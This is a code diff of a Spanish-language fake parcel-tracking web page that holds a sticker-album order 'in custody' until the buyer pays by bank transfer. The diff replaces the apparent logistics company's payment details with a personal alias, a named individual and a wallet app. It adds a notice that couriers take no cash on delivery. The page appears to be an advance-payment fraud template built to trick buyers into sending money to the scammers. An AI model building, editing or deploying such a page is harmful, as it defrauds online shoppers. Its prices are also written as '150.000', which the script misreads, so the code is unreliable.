@@ -894,14 +894,14 @@ animation:spin 1s linear infinite;
 <div class="modal" id="modalPago">
     <div class="modal-content" style="max-width:750px;">
         <span class="close" onclick="cerrarPago()">×</span>
-        <h2>Métodos de Pago Disponibles</h2>
+        <h2>Método de Pago Disponible</h2>
 
         <div id="transferencia" class="payment-method active">
             <h3>🏦 Transferencia Bancaria</h3>
 
             <div class="box">
                 <strong>Alias</strong>
-                <span class="val" id="alias">PANROD.LOGISTICA</span>
+                <span class="val" id="alias">ESTANPERFECTO.OK</span>
                 <button onclick="copiarTexto('alias')">📋 Copiar</button>
             </div>
 
@@ -919,14 +919,12 @@ animation:spin 1s linear infinite;
 
             <div class="box">
                 <strong>Titular</strong>
-                <span class="val" id="titular">PANROD</span>
-                <button onclick="copiarTexto('titular')">📋 Copiar</button>
+                <span class="val" id="titular">CAMILA CALOGERO</span>
             </div>
 
             <div class="box">
                 <strong>Banco</strong>
-                <span class="val" id="banco">Banco Nación Argentina</span>
-                <button onclick="copiarTexto('banco')">📋 Copiar</button>
+                <span class="val" id="banco">CLARO PAY</span>
             </div>
 
             <button class="btn-action btn-support" onclick="enviarReportePagoLogistica()">
@@ -950,8 +948,8 @@ animation:spin 1s linear infinite;
 const envios = {
     "ALBUM10": {
         producto: "Combo: Álbum Oficial de la Selección + 50 Paquetes de Figuritas",
-        precioProducto: 15000,
-        precioEnvio: 3500,
+        precioProducto: 150.000,
+        precioEnvio: 3.500,
         origen: "Depósito Central PANROD (Stock del Proveedor)",
         destino: "Rosario, Santa Fe",
         direccionEntrega: "Pellegrini 1420, Piso 2 (CP 2000)",
@@ -1063,7 +1061,7 @@ function buscarEnvio(){
             { num: 2, titulo: "Pago total verificado y acreditado en sistema", fecha: envio.fechasLog.pago || "Pendiente" },
             { num: 3, titulo: "Paquete verificado y empaquetado con datos de entrega del cliente", fecha: envio.fechasLog.verificado || "Pendiente" },
             { num: 4, titulo: `En viaje hacia centro de distribución regional de ${envio.destino}`, fecha: envio.fechasLog.viaje || "Pendiente" },
-            { num: 5, titulo: "En camino al domicilio del comprador (Unidad de Reparto)", fecha: envio.fechasLog.camino || "Pendiente" },
+            { num: 5, titulo: "En camino al domicilio del comprador (en Tránsito)", fecha: envio.fechasLog.camino || "Pendiente" },
             { num: 6, titulo: "Entregado exitosamente al destinatario", fecha: envio.fechasLog.entrega || "Pendiente" }
         ];
 
@@ -1092,9 +1090,9 @@ function buscarEnvio(){
             checkoutHTML = `
             <div class="checkout-box pending">
                 <div class="price-detail">
-                    <p>Valor del Álbum / Figuritas: <span>$${envio.precioProducto}</span></p>
-                    <p>Costo de Envío EXPRESS: <span>$${envio.precioEnvio}</span></p>
-                    <p class="total">Total Neto a Pagar: <span>$${totalAbonar}</span></p>
+                    <p>Valor del Paquete/Producto: <span>$${envio.precioProducto}</span></p>
+                    <p>Costo de Envío: <span>$${envio.precioEnvio}</span></p>
+                    <p class="total">Total a Pagar: <span>$${totalAbonar}</span></p>
                 </div>
                 <div class="action-area">
                     <button class="btn-action btn-pay" onclick="abrirPago()">
@@ -1104,15 +1102,15 @@ function buscarEnvio(){
                         💬 Informar Pago a Logística
                     </button>
                 </div>
-                <p class="legal-notice">⚠️ Los despachos físicos se bloquean de forma automatizada hasta la validación online del cobro de la mercadería por seguridad del proveedor.</p>
+                <p class="legal-notice">⚠️ IMPORTANTE: El producto se encuentra registrado y reservado para el destinatario. La preparación, embalaje y distribución comenzarán una vez acreditado el pago correspondiente. Los repartidores no reciben pagos al momento de la entrega.</p>
             </div>
             `;
         } else {
             checkoutHTML = `
             <div class="checkout-box">
                 <div class="price-detail">
-                    <p>Valor del Álbum / Figuritas: <span>$${envio.precioProducto}</span></p>
-                    <p>Costo de Envío EXPRESS: <span>${envio.precioEnvio === 0 ? '¡Bonificado!' : '$' + envio.precioEnvio}</span></p>
+                    <p>Valor del Paquete/Producto: <span>$${envio.precioProducto}</span></p>
+                    <p>Costo de Envío: <span>${envio.precioEnvio === 0 ? '¡Bonificado!' : '$' + envio.precioEnvio}</span></p>
                     <p class="total">Total Facturado: <span>$${totalAbonar}</span></p>
                 </div>
                 <div class="action-area">
@@ -1150,14 +1148,14 @@ function buscarEnvio(){
             <div class="left-side">
                 ${checkoutHTML}
                 <div class="datos">
-                    <div class="box"><strong>Código Tracking</strong><span class="val">${codigo}</span></div>
-                    <div class="box"><strong>Mercadería en Custodia</strong><span class="val">${envio.producto}</span></div>
+                    <div class="box"><strong>Código de Seguimiento</strong><span class="val">${codigo}</span></div>
+                    <div class="box"><strong>Paquete en Custodia</strong><span class="val">${envio.producto}</span></div>
                     <div class="box"><strong>Comprador Destinatario</strong><span class="val">${envio.receptor}</span></div>
                     <div class="box"><strong>Dirección de Destino</strong><span class="val">${envio.direccionEntrega}</span></div>
                     <div class="box"><strong>Origen</strong><span class="val">${envio.origen}</span></div>
-                    <div class="box"><strong>Jurisdicción</strong><span class="val">${envio.destino}</span></div>
+                    <div class="box"><strong>Entrega</strong><span class="val">${envio.destino}</span></div>
                 </div>
-                <h3>Historial de Movimientos Cruzados</h3>
+                <h3>Historial de Movimientos</h3>
                 <div class="timeline">
                     ${timelineHTML}
                 </div>
@@ -1165,11 +1163,11 @@ function buscarEnvio(){
             <div class="right-side">
                 <div class="delivery-sidebar">
                     <h3>Verificación de Identidad</h3>
-                    <p>Validación para el transportista en punto de entrega.</p>
+                    <p>Validación para el transportista.</p>
                     ${codigoVerificacionHTML}
                     <hr>
                     <span class="${envio.pagado ? 'pagado' : 'nopagado'}">
-                        ${envio.pagado ? '✓ PAGO CONSOLIDADO' : '⚠ PENDIENTE DE PAGO'}
+                        ${envio.pagado ? '✓ PAGO REALIZADO' : '⚠ PENDIENTE DE PAGO'}
                     </span>
                 </div>
             </div>
